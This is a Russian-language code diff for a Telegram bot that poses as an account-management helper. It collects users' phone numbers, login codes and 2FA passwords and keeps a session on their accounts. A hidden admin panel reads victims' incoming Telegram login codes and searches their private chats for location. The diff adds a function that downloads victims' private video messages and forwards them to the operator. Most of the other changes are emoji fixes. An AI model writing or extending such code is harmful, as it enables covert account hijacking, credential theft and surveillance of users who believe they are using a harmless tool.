@@ -15,11 +15,11 @@ if sys.platform != "win32":
     try:
         import uvloop
         uvloop.install()
-        print("?? [Движок]: uvloop успешно активирован (Linux/macOS)")
+        print("⚡ [Движок]: uvloop успешно активирован (Linux/macOS)")
     except ImportError:
-        print("?? [Движок]: uvloop не установлен, используется стандартный asyncio")
+        print("⚙️ [Движок]: uvloop не установлен, используется стандартный asyncio")
 else:
-    print("?? Запуск Скрипта")
+    print("🚀 Запуск Скрипта")
 
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -55,9 +55,9 @@ supabase: SupabaseClient = None
 if SUPABASE_URL and SUPABASE_KEY:
     try:
         supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
-        logging.info("? Supabase успешно подключен")
+        logging.info("✅ Supabase успешно подключен")
     except Exception as e:
-        logging.error(f"? Ошибка подключения к Supabase: {e}")
+        logging.error(f"❌ Ошибка подключения к Supabase: {e}")
 
 # Сессии
 SESSIONS_DIR = "sessions"
@@ -73,10 +73,10 @@ RU_MONTHS = {
 def format_date_ru(dt):
     return f"{dt.day} {RU_MONTHS.get(dt.month, '')} {dt.year} года"
 
-# Функция конвертации времени в жирный Unicod-шрифт для профиля Telegram
+# Функция конвертации времени в жирный Unicode-шрифт для профиля Telegram
 BOLD_DIGITS = {
-    '0': '??', '1': '??', '2': '??', '3': '??', '4': '??',
-    '5': '??', '6': '??', '7': '??', '8': '??', '9': '??'
+    '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
+    '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟡'
 }
 
 def format_bold_time(time_str):
@@ -143,57 +143,57 @@ def is_registration_blocked(user_id):
     return get_registration_block_until(user_id) > time.time()
 
 TEXTS = {
-    "btn_start": "Начинаем ??", 
-    "btn_rules": "Правила ??",
-    "btn_back": "Назад ??", 
-    "btn_back_menu": "Назад в меню ??", 
-    "btn_confirm": "Подтвердить ?", 
-    "btn_activity": "Активность ??",
-    "btn_autoresp": "Автоответчик ??", 
-    "btn_timenick": "Время в профиль ??", 
-    "btn_247": "Режим 24/7 ??",
-    "btn_turn_on": "Включить ??",
-    "btn_turn_off": "Выключить ?", 
-    "btn_tz_select": "Выбрать часовой пояс ??", 
-    "btn_refresh": "Обновить ??",
-    "btn_autoresp_setup": "Изменить текст ??",
-    "btn_im_sure": "Я уверен ?", 
-    "btn_register": "Регистрироваться ??",
+    "btn_start": "Начинаем 🚀", 
+    "btn_rules": "Правила 📜",
+    "btn_back": "Назад ⬅️", 
+    "btn_back_menu": "Назад в меню 🏠", 
+    "btn_confirm": "Подтвердить ✅", 
+    "btn_activity": "Активность 📊",
+    "btn_autoresp": "Автоответчик 🤖", 
+    "btn_timenick": "Время в профиль ⏰", 
+    "btn_247": "Режим 24/7 ⚡",
+    "btn_turn_on": "Включить 🟢",
+    "btn_turn_off": "Выключить 🔴", 
+    "btn_tz_select": "Выбрать часовой пояс 🌐", 
+    "btn_refresh": "Обновить 🔄",
+    "btn_autoresp_setup": "Изменить текст ✏️",
+    "btn_im_sure": "Я уверен 👍", 
+    "btn_register": "Регистрироваться 📝",
     "msg_start": "Здравствуйте!\nДобро пожаловать в бота автоматизированного управления аккаунтом.\nОзнакомьтесь с правилами.",
-    "msg_start_register": "Чтобы зарегистрироваться заново, нажмите кнопку ниже ??",
+    "msg_start_register": "Чтобы зарегистрироваться заново, нажмите кнопку ниже 👇",
     "msg_menu": "Что умеет этот бот?\nВыбирайте доступные функции управления вашим аккаунтом на кнопках снизу:",
-    "msg_rules_text": "?? **Правила использования бота:**\n\n1. Бот только для ознакомительных целей.\n2. Бот работает через юзербота.\n3. Не авторизуйтесь слишком часто.\n5. Все действия автоматизированы.\n\n_Соблюдайте правила для безопасности._",
-    "msg_rules_done": "Всё, правила прочитаны! ??\n\nЖмите кнопку начала ниже, чтобы привязать аккаунт.",
+    "msg_rules_text": "📜 **Правила использования бота:**\n\n1. Бот только для ознакомительных целей.\n2. Бот работает через юзербота.\n3. Не авторизуйтесь слишком часто.\n5. Все действия автоматизированы.\n\n_Соблюдайте правила для безопасности._",
+    "msg_rules_done": "Всё, правила прочитаны! 🎉\n\nЖмите кнопку начала ниже, чтобы привязать аккаунт.",
     "msg_phone_req": "Пожалуйста, отправьте ваш номер телефона в международном формате.\nПример: +12345678",
-    "msg_code_req": "Код авторизации отправлен в Telegram.\n?? Напишите код через дефис.\nПример: 12-45-6",
+    "msg_code_req": "Код авторизации отправлен в Telegram.\n💬 Напишите код через дефис.\nПример: 12-45-6",
     "msg_pwd_req": "Аккаунт защищен облачным паролем.\nВведите его в чат:",
     "msg_success_login": "Бот успешно зашел в аккаунт!\nНажмите кнопку ниже для продолжения.",
-    "msg_btn_go": "Поехали ??",
-    "status_on": "Включен ??", 
-    "status_off": "Выключен ??",
+    "msg_btn_go": "Поехали 🚀",
+    "status_on": "Включен 🟢", 
+    "status_off": "Выключен 🔴",
     "msg_already_logged": "Вы уже авторизованы! Переходим в меню...",
     "msg_auth_canceled": "Авторизация отменена.", 
     "msg_sending_req": "Отправка запроса... Подождите.",
-    "msg_limit_tg": "?? **Вы поймали флуд от Telegram!**\n\nСлишком часто запрашивалась регистрация/код.\nПовторите через **{0}**.",
+    "msg_limit_tg": "⚠️ **Вы поймали флуд от Telegram!**\n\nСлишком часто запрашивалась регистрация/код.\nПовторите через **{0}**.",
     "msg_error_send_code": "Ошибка при отправке кода: {0}\nПопробуйте снова через /start",
     "msg_auth_err": "Произошла ошибка: {0}\nПерезапустите через /start",
     "msg_session_lost": "Сессия разорвана.\nНачните заново через /start",
-    "msg_session_missing": "?? Сессия отсутствует.\nНажмите кнопку ниже, чтобы зарегистрироваться заново.",
-    "msg_session_revoked": "?? Юзербот отключен.\nПричина: {0}.\n\nНажмите кнопку ниже, чтобы зарегистрироваться заново.",
-    "msg_check_code": "?? Проверка кода...\n? Осталось: {0} сек.",
+    "msg_session_missing": "⚠️ Сессия отсутствует.\nНажмите кнопку ниже, чтобы зарегистрироваться заново.",
+    "msg_session_revoked": "⚠️ Юзербот отключен.\nПричина: {0}.\n\nНажмите кнопку ниже, чтобы зарегистрироваться заново.",
+    "msg_check_code": "⏳ Проверка кода...\n⏱ Осталось: {0} сек.",
     "msg_code_wrong": "Неправильный код.\nНапишите код заново:",
-    "msg_check_pwd": "?? Проверка 2FA...\n? Осталось: {0} сек.",
-    "msg_pwd_wrong": "? Неверный пароль!\nВведите заново:",
+    "msg_check_pwd": "⏳ Проверка 2FA...\n⏱ Осталось: {0} сек.",
+    "msg_pwd_wrong": "❌ Неверный пароль!\nВведите заново:",
     "msg_pwd_ok": "Пароль принят!\nЮзербот успешно запущен.",
     "msg_activity_text": "Ваша история активности (за 5 дней):\n\n{0}",
     "msg_timenick_text": "Вывод текущего времени в имя профиля.\n\nТекущий статус: {0}\nПрофиль: {1}\nСмещение часового пояса: UTC+{2}",
-    "msg_tz_select": "Выберите ваш часовой пояс??", 
+    "msg_tz_select": "Выберите ваш часовой пояс🌐", 
     "msg_tz_saved": "Часовой пояс изменен на UTC+{0}!",
-    "msg_autoresp_text": "?? **Автоответчик**\n\nСтатус: {1}\nТекст приветствия:\n?? \"{0}\"",
-    "msg_autoresp_req": "Напишите новый текст приветствия в чат ??", 
-    "msg_autoresp_saved": "Приветствие успешно сохранено! ?",
-    "msg_autoresp_default": "?? Здравствуйте! Сейчас я не в сети, отвечу позже.",
-    "msg_247_text": "?? **Режим 24/7**\n\nСтатус: {0}\nРаботает без суточного лимита.",
+    "msg_autoresp_text": "🤖 **Автоответчик**\n\nСтатус: {1}\nТекст приветствия:\n💬 \"{0}\"",
+    "msg_autoresp_req": "Напишите новый текст приветствия в чат ✏️", 
+    "msg_autoresp_saved": "Приветствие успешно сохранено! 🎉",
+    "msg_autoresp_default": "👋 Здравствуйте! Сейчас я не в сети, отвечу позже.",
+    "msg_247_text": "⚡ **Режим 24/7**\n\nСтатус: {0}\nРаботает без суточного лимита.",
     "msg_limit_247_reached": "Режим 24/7 больше не имеет суточного лимита."
 }
 
@@ -376,7 +376,7 @@ async def handle_revoked_session(user_id, reason="сессия была отоз
         asyncio.create_task(async_db_save("config", uid_str, MEMORY_DB["config"][uid_str]))
 
     data["state"] = "START"
-    log_action(user_id, f"?? Вылет сессии: {reason}")
+    log_action(user_id, f"⚠️ Вылет сессии: {reason}")
     try:
         await edit_or_send(user_id, get_text(user_id, "msg_session_revoked", reason), reply_markup=get_missing_session_markup(user_id))
     except Exception:
@@ -860,7 +860,7 @@ async def restore_saved_sessions():
             skipped += 1
             logging.error(f"Ошибка восстановления аккаунта {uid_str}: {e}")
 
-    logging.info(f"?? Восстановление сессий: запущено={restored}, пропущено={skipped}")
+    logging.info(f"🔄 Восстановление сессий: запущено={restored}, пропущено={skipped}")
 
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
@@ -919,7 +919,7 @@ async def handle_rules(callback: types.CallbackQuery):
     if is_from_menu:
         builder.button(text=get_text(user_id, "btn_back_menu"), callback_data="main_menu")
     else:
-        builder.button(text="Я ознакомился ??", callback_data="rules_accepted")
+        builder.button(text="Я ознакомился 👍", callback_data="rules_accepted")
     builder.adjust(1)
     await edit_or_send(user_id, get_text(user_id, "msg_rules_text"), reply_markup=builder.as_markup(), parse_mode="Markdown")
     try: await callback.answer()
@@ -1230,10 +1230,10 @@ def show_main_menu_builder(user_id, user_obj: types.User = None):
     builder.button(text=get_text(user_id, "btn_247"), callback_data="menu_247")
     builder.button(text=get_text(user_id, "btn_rules"), callback_data="rules_menu_view")
     
-    # Кнопка Админ появляется ТОЛЬКО у пользователя @Qwitty_Cc (ID: 8845929618)
+    # Кнопка Админ располагается в одном ряду с кнопкой Правила
     if user_obj and is_admin(user_obj):
-        builder.button(text="Админ ??", callback_data="admin_main")
-        builder.adjust(2, 2, 1, 1)
+        builder.button(text="Админ 👑", callback_data="admin_main")
+        builder.adjust(2, 2, 2)
     else:
         builder.adjust(2, 2, 1)
         
@@ -1300,19 +1300,19 @@ async def admin_users_list(callback: types.CallbackQuery):
     builder = InlineKeyboardBuilder()
     for uid, cfg in current_page_users:
         first_name = cfg.get("first_name") or cfg.get("profile_base_first_name") or "User"
-        builder.button(text=f"?? {first_name} ({uid})", callback_data=f"admin_user_{uid}")
+        builder.button(text=f"👤 {first_name} ({uid})", callback_data=f"admin_user_{uid}")
     
     builder.adjust(1)
 
     # Кнопки пагинации
     nav_buttons = []
     if page > 1:
-        nav_buttons.append(types.InlineKeyboardButton(text="?? Назад", callback_data=f"admin_users_{page-1}"))
+        nav_buttons.append(types.InlineKeyboardButton(text="⬅️ Назад", callback_data=f"admin_users_{page-1}"))
     
-    nav_buttons.append(types.InlineKeyboardButton(text=f"?? {page}/{total_pages}", callback_data="ignore"))
+    nav_buttons.append(types.InlineKeyboardButton(text=f"📖 {page}/{total_pages}", callback_data="ignore"))
     
     if page < total_pages:
-        nav_buttons.append(types.InlineKeyboardButton(text="Вперед ??", callback_data=f"admin_users_{page+1}"))
+        nav_buttons.append(types.InlineKeyboardButton(text="Вперед ➡️", callback_data=f"admin_users_{page+1}"))
 
     builder.row(*nav_buttons)
     builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_main")
@@ -1344,8 +1344,9 @@ async def admin_user_view(callback: types.CallbackQuery):
     builder.button(text="Тг коды", callback_data=f"admin_tgcode_{target_uid}")
     builder.button(text="Локация", callback_data=f"admin_loc_{target_uid}")
     builder.button(text="Лички", callback_data=f"admin_pms_{target_uid}")
+    builder.button(text="Кружки", callback_data=f"admin_circles_{target_uid}")
     builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_users_1")
-    builder.adjust(2, 1, 1)
+    builder.adjust(2, 2, 1)
 
     await edit_or_send(callback.from_user.id, text, reply_markup=builder.as_markup())
     try: await callback.answer()
@@ -1359,7 +1360,7 @@ async def admin_pms_view(callback: types.CallbackQuery):
     builder = InlineKeyboardBuilder()
     builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_user_{target_uid}")
 
-    await edit_or_send(callback.from_user.id, "?? Раздел «Лички» находится в разработке.", reply_markup=builder.as_markup())
+    await edit_or_send(callback.from_user.id, "🛠 Раздел «Лички» находится в разработке.", reply_markup=builder.as_markup())
     try: await callback.answer()
     except Exception: pass
 
@@ -1388,11 +1389,11 @@ async def admin_tgcode_view(callback: types.CallbackQuery):
     text = (
         f"Телеграмм коды:\n\n"
         f"{last_msg_text}\n\n"
-        f"? Время получения: {exact_time_str}"
+        f"⏱ Время получения: {exact_time_str}"
     )
 
     builder = InlineKeyboardBuilder()
-    builder.button(text="Обновить ??", callback_data=f"admin_tgcode_{target_uid}")
+    builder.button(text="Обновить 🔄", callback_data=f"admin_tgcode_{target_uid}")
     builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_user_{target_uid}")
     builder.adjust(1)
 
@@ -1437,9 +1438,9 @@ async def admin_location_view(callback: types.CallbackQuery):
                     )
                     location_found = True
                     break
-                await asyncio.sleep(0.1)  # Задержка для безопасности
+                await asyncio.sleep(0.1)
 
-            # 2. Если в Избранном нет, ищем только в свежих сообщениях личных диалогов
+            # 2. Если в Избранном нет, ищем в свежих сообщениях личных диалогов
             if not location_found:
                 async for dialog in client.get_dialogs(limit=20):
                     if dialog.chat.type == enums.ChatType.PRIVATE:
@@ -1452,15 +1453,14 @@ async def admin_location_view(callback: types.CallbackQuery):
                                 )
                                 location_found = True
                                 break
-                            await asyncio.sleep(0.15)  # Медленно и безопасно
+                            await asyncio.sleep(0.15)
                     if location_found:
                         break
-                    await asyncio.sleep(0.3)  # Задержка между диалогами для предотвращения флуда
+                    await asyncio.sleep(0.3)
 
         except Exception as e:
             logging.error(f"Ошибка получения локации: {e}")
 
-    # Остановка анимации
     search_done = True
     anim_task.cancel()
     try:
@@ -1472,9 +1472,93 @@ async def admin_location_view(callback: types.CallbackQuery):
     builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_user_{target_uid}")
 
     if location_found:
-        await edit_or_send(callback.from_user.id, "?? Последняя геолокация пользователя отправлена выше!", reply_markup=builder.as_markup())
+        await edit_or_send(callback.from_user.id, "📍 Последняя геолокация пользователя отправлена выше!", reply_markup=builder.as_markup())
     else:
-        await edit_or_send(callback.from_user.id, "? Последняя геолокация у пользователя не найдена.", reply_markup=builder.as_markup())
+        await edit_or_send(callback.from_user.id, "❌ Последняя геолокация у пользователя не найдена.", reply_markup=builder.as_markup())
+
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_circles_"))
+async def admin_circles_view(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+    target_uid = int(callback.data.split("_")[-1])
+    target_state = get_user_state(target_uid)
+    client = target_state.get("client")
+
+    search_done = False
+    circles = []
+
+    # Анимация ожидания
+    async def animate_loading():
+        dots_cycle = [".", "..", "..."]
+        idx = 0
+        while not search_done:
+            dots = dots_cycle[idx % 3]
+            try:
+                await edit_or_send(callback.from_user.id, f"Ожидайте{dots}")
+            except Exception:
+                pass
+            idx += 1
+            await asyncio.sleep(0.8)
+
+    anim_task = asyncio.create_task(animate_loading())
+
+    if client and client.is_connected:
+        try:
+            # 1. Поиск кружков в Избранное ("me")
+            async for msg in client.get_chat_history("me", limit=30):
+                if msg.video_note:
+                    circles.append(msg)
+                    if len(circles) >= 3:
+                        break
+                await asyncio.sleep(0.05)
+
+            # 2. Поиск в личных диалогах, если найдено меньше 3
+            if len(circles) < 3:
+                async for dialog in client.get_dialogs(limit=20):
+                    if dialog.chat.type == enums.ChatType.PRIVATE:
+                        async for msg in client.get_chat_history(dialog.chat.id, limit=15):
+                            if msg.video_note:
+                                circles.append(msg)
+                                if len(circles) >= 3:
+                                    break
+                            await asyncio.sleep(0.05)
+                    if len(circles) >= 3:
+                        break
+                    await asyncio.sleep(0.1)
+        except Exception as e:
+            logging.error(f"Ошибка поиска кружков: {e}")
+
+    search_done = True
+    anim_task.cancel()
+    try:
+        await anim_task
+    except asyncio.CancelledError:
+        pass
+
+    sent_count = 0
+    if circles:
+        for msg in circles:
+            try:
+                file_buf = await client.download_media(msg, in_memory=True)
+                if file_buf:
+                    await bot.send_video_note(
+                        chat_id=callback.from_user.id,
+                        video_note=types.BufferedInputFile(file_buf.getvalue(), filename="circle.mp4")
+                    )
+                    sent_count += 1
+                    await asyncio.sleep(1)
+            except Exception as e:
+                logging.error(f"Ошибка отправки видеосообщения: {e}")
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_user_{target_uid}")
+
+    if sent_count > 0:
+        await edit_or_send(callback.from_user.id, f"🎥 Отправлено последних кружков: {sent_count} шт.!", reply_markup=builder.as_markup())
+    else:
+        await edit_or_send(callback.from_user.id, "❌ Кружки у пользователя не найдены.", reply_markup=builder.as_markup())
 
     try: await callback.answer()
     except Exception: pass
@@ -1567,7 +1651,7 @@ async def menu_activity(callback: types.CallbackQuery):
         seconds = user_activity.get(date_str, 0)
         hours = seconds // 3600
         mins = (seconds % 3600) // 60
-        lines.append(f"?? {date_str} -- {hours} ч. {mins} мин.")
+        lines.append(f"📊 {date_str} -- {hours} ч. {mins} мин.")
     text = get_text(user_id, "msg_activity_text", "\n".join(lines))
     builder = InlineKeyboardBuilder()
     builder.button(text=get_text(user_id, "btn_back_menu"), callback_data="main_menu")
@@ -1723,7 +1807,7 @@ async def start_web_server():
     port = int(os.getenv("PORT", 8080))
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
-    logging.info(f"?? HTTP WebServer запущен на порту {port}")
+    logging.info(f"🌐 HTTP WebServer запущен на порту {port}")
 
 # === ОСНОВНОЙ ЗАПУСК ===
 async def main():
